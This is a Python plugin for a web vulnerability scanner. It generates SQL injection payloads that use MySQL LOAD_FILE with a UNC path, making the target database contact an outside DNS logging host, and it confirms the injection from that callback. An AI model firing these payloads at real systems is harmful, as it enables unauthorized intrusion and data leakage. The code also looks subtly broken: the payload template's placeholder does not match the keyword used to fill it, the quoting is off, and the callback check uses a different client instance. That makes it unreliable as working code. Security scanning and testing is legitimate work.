#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# JiuZero 2025/8/20

import re
from urllib.parse import quote
from lib.core.settings import acceptedExt
from lib.api.reverse_api import reverseApi
from api import generateResponse, random_num, conf, PLACE, VulType, POST_HINT, Type, PluginBase, Threads, KB

class Z0SCAN(PluginBase):
    name = "sqli-dnslog"
    desc = 'sqli-dnslog'
    version = "2025.8.20"
    risk = 2
    require_reverse = True
        
    def audit(self):
        url = self.requests.url
        self.rA = reverseApi()
        if conf.level == 0 or not self.risk in conf.risk:
            return
        if not self.fingerprints.waf and self.requests.suffix in acceptedExt:
            payload = r"LOAD_FILE(CONCAT('\\\\',{}\\abc'))"
            payloads = []
            patternClose = ['',"'","')",'"','")']
            patternLink = ['and', 'or', 'like', '=', '<', '>', 'regexp']
            for i in patternClose:
                for j in patternLink:
                    payloads.append('{} {} {}#'.format(i, j, payload))
            iterdatas = self.generateItemdatas()
            z0thread = Threads(name="sqli-dnslog")
            z0thread.submit(self.process, iterdatas, payloads)
                
    def process(self, _, payloads):
        rA = reverseApi()
        k, v, position = _
        if position in [PLACE.JSON_DATA, PLACE.MULTIPART_DATA, PLACE.XML_DATA]:
            return
        for payload in payloads:
            for type in ["dns"]:
                if type in KB.reverse_running_server:
                    token, fullname = self.rA.generate(type)
                    payload = payload.format(fullname=fullname)
                    _payload = self.insertPayload({
                        "key": k, 
                        "payload": payload, 
                        "position": position, 
                        })
                    r = self.req(position, _payload)
                    if not r:
                        continue
                    if rA.check(token):
                        result = self.generate_result()
                        result.main({
                            "type": Type.REQUEST, 
                            "url": r.url, 
                            "vultype": VulType.SQLI, 
                            "show": {
                                "Position": f"{position} >> {k}", 
                                "Payload": payload,
                                "Msg": "Receive from Dnslog",
                                }
                            })
                        result.step("Request1", {
                            "position": position,
                            "request": r.reqinfo, 
                            "response": generateResponse(r), 
                            "desc": "Payload: {} Receive from Dnslog".format(payload),
                            })
                        self.success(result)
                        break